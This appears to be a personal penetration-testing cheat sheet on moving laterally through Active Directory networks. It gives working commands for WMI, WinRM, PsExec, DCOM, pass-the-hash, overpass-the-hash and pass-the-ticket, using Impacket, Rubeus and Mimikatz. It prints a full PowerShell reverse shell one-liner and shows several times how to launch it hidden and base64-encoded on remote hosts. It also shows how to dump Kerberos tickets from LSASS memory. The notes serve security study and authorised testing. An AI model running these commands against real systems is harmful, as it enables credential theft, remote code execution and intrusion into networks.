# Active Directory Lateral Movement

## Windows Management Instrumentation (WMI)

WMI is an object-oriented feature that facilitates task automation.

It can create processes using the `Create` method from the `Win32_Process` class and communicated over RPC on port 135 and a higher range port (19152-65535) for session data.

For both of the methods below, we can replace `calc` with a PowerShell reverse shell one-liner encrypted in base64 and called via `powershell -nop -w hidden -e <BASE64_POWERSHELL_REVSHELL>`.

### wmic

Now deprecated but most likely still around. Example usage:

```
# Creates a calc.exe process on a target machine authenticating as target user

wmic /node:<TARGET_IP> /user:<USERNAME> /password:<PASSWORD> process call create "calc"
```

### WMI in PowerShell

Uses the Common Information Model (CIM).

```
# Make PowerShell credential
$username = <USERNAME>;
$password = <PASSWORD>;
$secureString = ConvertTo-SecureString $password -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential($username, $secureString);

# Configure WMI CIM
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <TARGET> -Credential $cred -SessionOption $Options;
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create Arguments @{CommandLine = $command}
```


## Windows Remote Management (WinRM)

Microsoft's implementation of WS-Management protocol. Communicates by sending XML messages over HTTP/HTTPS on ports 5985/5986 respectively.

Similar to WMI, can replace `calc` in either of these commands with `powershell -nop -w hidden -e <BASE64_POWERSHELL_REVSHELL>`

Where the encrypted payload is a base64 encoded PowerShell reverse shell:

```
$client = New-Object System.Net.Sockets.TCPClient("<TARGET_IP>",<TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### winrs

```
winrs -r:<TARGET_HOST> -u:<USERNAME> -p:<PASSWORD> "calc"
```

### WinRM in PowerShell

```
# Make PowerShell credential
$username = <USERNAME>;
$password = <PASSWORD>;
$secureString = ConvertTo-SecureString $password -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential($username, $secureString);

# WinRM
New-PSSession -ComputerName <TARGET_IP> -Credential $cred
Enter-PSSession <ID>
```

### Evil-WinRM

Can do stuff like:
- Pass-the-hash
- In-memory loading
- File upload / download
- Connect to targets with stable shell

https://github.com/Hackplayers/evil-winrm

## PsExec

Part of `SysInterals` suite. Provides remote execution of process and other systems through an interactive console.

### Pre-requisites

- User needs to be part of local administrator group on attacking machine (or target machine?? feels like target machine to me)
- `ADMINS$` share must be available (set by default on modern Windows)
- File and Printer Sharing has to be turned on (default on modern Windows)

### Function

- Writes `psexecvc.exe` in `C:\Windows` directory
- Creates and spawns a remote host
- Runs the specified program / command as a child process of `psexecvc.exe`

### Execution

```
PS C:\> .\PsExec64.exe -i \\<TARGET_HOST> -u <DOMAIN>\<USER> -p <PASSWORD> <COMMAND>
```  


## Pass the Hash

Applicable to NTLM authentication only, not Kerberos.

Attacking machine connects to the target machine using SMB protocol and performs authentication with the NTLM hash.

Can then go further and start a Windows service (e.g. cmd or PowerShell) and communicate with it using Named Pipes, **but this is only needed for gaining RCE**. Other abuses, e.g. SMB share access, do not require a Windows service to be created.

As of a 2014 security update, this lateral movement technique only works for domain users and the built-in local admin account, but **does not work for any other local administrator account**.

### Pre-requisites

- Requires SMB connection
- Windows File and Printer Sharing must be enabled (enabled by default on modern Windows)
- `ADMIN$` share must be available (enabled by default on modern Windows)
- Local admin rights on target

### Execution

Many tools can do this e.g.
- PsExec from Metasploit
- Passsing-the-hash toolkit
- Impacket

```
impacket-wmiexec -hashes :<NTLM_HASH> <USERNAME>@<TARGET_IP>
```


## Overpass the Hash

Applicable to Kerberos authentication only, not NTLM.

NTLM hash of principal is used as a secret key for Kerberos preauthentication, so if we obtain an NTLM hash, we can use that to encrypt a timestamp and request a TGT on behalf of some user.

TGT can then be loaded into memory. When we connect to a service, Windows checks memory cache first so will use whatever TGT we loaded into memory to perform Kerberos authentication to access a service.


### Execution

WINDOWS: Rubeus

```
C:\> klist purge
C:\> .\Rubeus.exe asktgt /domain:<TARGET_DOMAIN> /user:<USERNAME> /rc4:<NTLM_HASH> /ptt
C:\> ls \\server\share  # For priv esc / lateral movement
```

WINDOWS: Mimikatz

```
# Start a powershell session in the context of TARGET_USER
mimikatz # sekurlsa::pth /user:<TARGET_USER> /domain:<TARGET_DOMAIN> /ntlm:<NTLM_HASH> /run:<CMD>

# Authenticate to a service to get a TGT
C:\> net use \\<SERVER>
C:\> klist
```

THEN use `PsExec` from `SysInternals` suite.

```
.\PsExec.exe \\<SERVER> calc
```

**Don't forget to `klist purge` after testing.**


## Pass the Ticket

This is about reusing TGS tickets. A TGS ticket can be used from any part of the network, whereas TGT can only be used from the client IP specified. TGS can only be used for the specified service though.

Does not require admin rights if TGS belongs to the current user.

### Execution

WINDOWS: Mimikatz

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

C:\> dir *.kirbi

mimikatz # kerberos::ptt <TGS_KIRBI_FILE>

C:\> klist
```

Line-by-line, these commands:
1. Enable `SeDebugPrivilege` program debug privileges.
2. Export all tickets to current directory by parsing LSASS process memory space.
3. View all ticket `.kirbi` files. TGS tickets will have `@cifs` whereas TGTs have `@krbtgt`.
4. Inject TGS ticket into memory.
5. View tickets in memory.


## DCOM

COM = Component Object Model = system for creating software components that interact with each other, single-process or cross-process.

DCOM = Distributed Component Object Model = extends above for interaction between multiple computers on a network.

Communicate via RPC over TCP on port 135. **Local administrator access is required** to call DCOM service manager (which is basically an API).

Lots of lateral movement techniques exploiting this functionality can be found here: https://www.cybereason.com/blog/dcom-lateral-movement-techniques.

### Execution

Example walkthrough with a specific technique, abusing Microsoft Management Console COM application (used for scripted automation of Windows systems). **Needs local admin rights**.

We can create an "Application Object" (https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object) which expose the `ExecuteShellCommand` method under `Document.ActiveView` property which we can exploit for RCE.

```
PS C:\> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "<TARGET_IP>"))

PS C:\> $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
```

Parameters for second command mean:
1. What command to execute
2. Directory to execute in
3. Parameters to run for command
4. WindowState - 7 usually works for most cases

For a reverse shell, we could try `$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e <BASE64_POWERSHELL_REVSHELL>", "7")`.

**NOTE: THE POWERSHELL PAYLOAD MUST BE BASE64 ENCODED WITH UNICODE (UTF-16), NOT ASCII**

```
echo <POWERSHELL_PAYLOAD> | iconv -t UTF-16LE | base64  # Linux

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("<POWERSHELL_PAYLOAD>"))
```